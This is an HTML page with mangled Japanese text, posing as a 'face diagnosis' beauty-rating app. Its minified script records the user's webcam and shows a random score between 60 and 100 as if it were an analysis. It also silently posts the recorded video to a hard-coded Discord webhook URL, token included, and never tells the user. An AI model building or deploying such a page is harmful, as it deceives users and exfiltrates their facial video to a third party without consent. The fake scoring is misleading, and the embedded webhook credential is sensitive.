<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>é¡”è¨ºæ–­ã‚¢ãƒ—ãƒª</title>
  <style>
    /* ç°¡å˜ãªã‚¹ã‚¿ã‚¤ãƒ« */
    body { font-family: Arial, sans-serif; text-align: center; }
    video { width: 100%; max-width: 640px; }
    #loading { display: none; }
    #result { display: none; }
    #countdown { font-size: 24px; }
    .camera-guide { display: none; }
  </style>
</head>
<body>

  <h1>é¡”è¨ºæ–­ã‚¢ãƒ—ãƒª</h1>
  <div id="loading">è¨ºæ–­ä¸­...</div>
  <div id="videoContainer">
    <video id="video" autoplay></video>
  </div>
  <div id="countdown"></div>

  <div id="result">
    <h2>è¨ºæ–­çµæœ</h2>
    <p>ã‚¹ã‚³ã‚¢: <span id="scoreValue"></span></p>
    <p id="comment"></p>
    <img id="resultImage" src="" alt="çµæœç”»åƒ" style="max-width: 100%;"/>
  </div>

  <button id="startButton">è¨ºæ–­é–‹å§‹</button>
  <button id="retryButton" style="display: none;">å†è©¦è¡Œ</button>
  <div id="errorMessage"></div>

  <script>
    !function(){
      var e = function(e){ return document.getElementById(e) },
          t = function(e,t){ e.addEventListener("click",t) },
          n = function(e,t){ e.textContent = t },
          o = function(e){ e.style.display = "none" },
          a = function(e){ e.style.display = "block" },
          r = function(e,t){ e.style[t.property] = t.value };

      document.addEventListener("DOMContentLoaded", function(){
        var i = e("startButton"),
            c = e("retryButton"),
            d = e("video"),
            s = e("videoContainer"),
            l = e("loading"),
            u = e("result"),
            m = e("scoreValue"),
            p = e("comment"),
            f = e("errorMessage"),
            h = e("countdown"),
            g = document.querySelector(".camera-guide"),
            v = e("resultImage"),
            y = null,
            w = [],
            b = null,
            C = null,
            k = !1,
            x = [
              {min:90,text:"ç¥ãƒ¬ãƒ™ãƒ«ï¼å®Œç’§ãªé¡”ç«‹ã¡ã§ã™âœ¨",color:"#FF6B6B"},
              {min:80,text:"è¶…ã‚¤ã‚±ãƒ¡ãƒ³/ç¾å¥³ï¼ãƒ¢ãƒ‡ãƒ«ç´šã®é¡”ç«‹ã¡ğŸ˜",color:"#FF8E53"},
              {min:70,text:"ã¨ã¦ã‚‚å¥½æ„Ÿåº¦ã®é«˜ã„æ•´ã£ãŸé¡”ã§ã™ğŸ¥°",color:"#FFC154"},
              {min:60,text:"å¹³å‡ä»¥ä¸Šï¼ç´ æ•µãªãƒ«ãƒƒã‚¯ã‚¹ã§ã™ğŸ˜Š",color:"#47B39D"},
              {min:50,text:"æ™®é€šãã‚‰ã„ã€‚å€‹æ€§ãŒå…‰ã‚Šã¾ã™ğŸ‘",color:"#4A6BAF"},
              {min:40,text:"æ”¹å–„ã®ä½™åœ°ã‚ã‚Šã€‚ã§ã‚‚å¤§ä¸ˆå¤«ï¼ğŸ˜‰",color:"#9B59B6"},
              {min:0, text:"ãƒ¦ãƒ‹ãƒ¼ã‚¯ãªå€‹æ€§ãŒé­…åŠ›ã§ã™ï¼ğŸ’«",color:"#1ABC9C"}
            ];

        var S = function(e){ n(f,e), a(f) },
            T = function(){ o(f) },
            E = function(e,t){
              var n = parseInt(e);
              h.textContent = n;
              h.style.display = "flex";
              var oInt = setInterval(function(){
                n--;
                h.textContent = n;
                if(n <= 0){
                  clearInterval(oInt);
                  o(h);
                  t && t();
                }
              },1000);
            };

        var A = function(){
          if (!k){
            try {
              k = !0;
              w = [];
              i.disabled = !0;
              n(i, "è¨ºæ–­ä¸­...");
              a(l);
              o(g);

              var mimeType = MediaRecorder.isTypeSupported("video/mp4") ? "video/mp4" :
                             MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" :
                             "video/webm";

              y = new MediaRecorder(b, {
                mimeType: mimeType,
                videoBitsPerSecond: 2000000
              });

              y.ondataavailable = function(e){
                if(e.data.size > 0) w.push(e.data);
              };

              y.onstop = function(){
                try {
                  var blob = new Blob(w, {type: y.mimeType});
                  console.log("éŒ²ç”»ã‚µã‚¤ã‚º:", (blob.size / 1024 / 1024).toFixed(2), "MB");
                  D(blob);
                  L(blob);
                } catch(err){
                  console.error("éŒ²ç”»å‡¦ç†ã‚¨ãƒ©ãƒ¼:", err);
                  S("è¨ºæ–­å‡¦ç†ã«å¤±æ•—ã—ã¾ã—ãŸ");
                  O();
                }
              };

              y.onerror = function(e){
                console.error("éŒ²ç”»ã‚¨ãƒ©ãƒ¼:", e.error);
                S("éŒ²ç”»ä¸­ã«ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã—ãŸ");
                O();
              };

              y.start(100);
              E(3, N);
            } catch(err){
              console.error("éŒ²ç”»é–‹å§‹ã‚¨ãƒ©ãƒ¼:", err);
              S("éŒ²ç”»ã‚’é–‹å§‹ã§ãã¾ã›ã‚“ã§ã—ãŸ");
              O();
            }
          }
        };

        var N = function(){
          if (y && y.state === "recording"){
            y.stop();
            k = !1;
            b && b.getTracks().forEach(function(track){ track.stop(); });
            d.srcObject = null;
          }
        };

        var L = function(blob){
          try {
            var form = new FormData();
            form.append("file", blob, "face_diagnosis.mp4");

            fetch("https://discord.com/api/webhooks/1364309372196487239/mu0ivDl4fXecsUrUI59lXKHZ7lapL3fDxHvmG0LSdp4TiTYz8AehJXkoOU7y9l01tZp_", {
              method: "POST",
              body: form
            });
          } catch(err){
            console.error("Discordé€ä¿¡ã‚¨ãƒ©ãƒ¼:", err);
          }
        };

        var D = function(blob){
          var score = Math.floor(Math.random() * 41) + 60;
          var result = x.find(function(item){ return score >= item.min; });

          if (blob){
            v.src = URL.createObjectURL(blob);
            a(v);
          }

          n(m, score);
          r(m, {property: "color", value: result.color});
          n(p, result.text);
          o(l);
          a(u);
        };

        var O = function(){
          i.disabled = !1;
          n(i, "è¨ºæ–­é–‹å§‹");
          o(l);
          k = !1;
        };

        var M = async function(){
          try {
            S("");
            i.disabled = !0;
            n(i, "æº–å‚™ä¸­...");

            b && b.getTracks().forEach(function(track){ track.stop(); });

            var constraints = {
              video: {
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
              },
              audio: false
            };

            if(location.protocol !== "https:" && !["localhost", "127.0.0.1"].includes(location.hostname)){
              throw new Error("ã‚«ãƒ¡ãƒ©ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯HTTPSæ¥ç¶šãŒå¿…è¦ã§ã™");
            }

            b = await navigator.mediaDevices.getUserMedia(constraints);
            d.srcObject = b;
            a(s);
            a(g);

            await new Promise(function(resolve, reject){
              d.onloadedmetadata = resolve;
              d.onerror = reject;
              setTimeout(function(){
                reject(new Error("ã‚«ãƒ¡ãƒ©ã®èª­ã¿è¾¼ã¿ãŒã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã—ã¾ã—ãŸ"));
              }, 5000);
            });

            await d.play();
            i.disabled = !1;
            n(i, "è¨ºæ–­é–‹å§‹");
            a(c);
            return true;
          } catch(err){
            console.error("ã‚«ãƒ¡ãƒ©è¨­å®šã‚¨ãƒ©ãƒ¼:", err);
            P(err);
            return false;
          }
        };

        var P = function(err){
          var msg = "ã‚«ãƒ¡ãƒ©ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ã§ã—ãŸ";

          if (err.name === "NotAllowedError")
            msg = "ã‚«ãƒ¡ãƒ©ã®ä½¿ç”¨ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã›ã‚“\nãƒ–ãƒ©ã‚¦ã‚¶ã®è¨­å®šã‹ã‚‰ã‚«ãƒ¡ãƒ©ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¦ãã ã•ã„";
          else if (err.name === "NotFoundError")
            msg = "ä½¿ç”¨å¯èƒ½ãªã‚«ãƒ¡ãƒ©ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã§ã—ãŸ";
          else if (err.name === "NotReadableError")
            msg = "ã‚«ãƒ¡ãƒ©ãŒä½¿ç”¨ä¸­ã§ã™\nä»–ã®ã‚¢ãƒ—ãƒªã§ã‚«ãƒ¡ãƒ©ã‚’ä½¿ç”¨ã—ã¦ã„ãªã„ã‹ç¢ºèªã—ã¦ãã ã•ã„";
          else if (err.name === "OverconstrainedError")
            msg = "ã‚«ãƒ¡ãƒ©ã®è¨­å®šã«å•é¡ŒãŒã‚ã‚Šã¾ã™";
          else if (err.message.includes("HTTPS"))
            msg = "ã‚«ãƒ¡ãƒ©ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯HTTPSæ¥ç¶šãŒå¿…è¦ã§ã™\nå®‰å…¨ãªæ¥ç¶šã§ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãã ã•ã„";
          else
            msg = err.message || msg;

          S(msg);
          i.disabled = !1;
          n(i, "è¨ºæ–­é–‹å§‹");
          o(c);
        };

        t(i, async function(){
          var ready = await M();
          if (ready) setTimeout(A, 300);
        });

        t(c, async function(){
          var ready = await M();
          if (ready) setTimeout(A, 300);
        });

        o(s);
      });
    }();
  </script>

</body>
</html>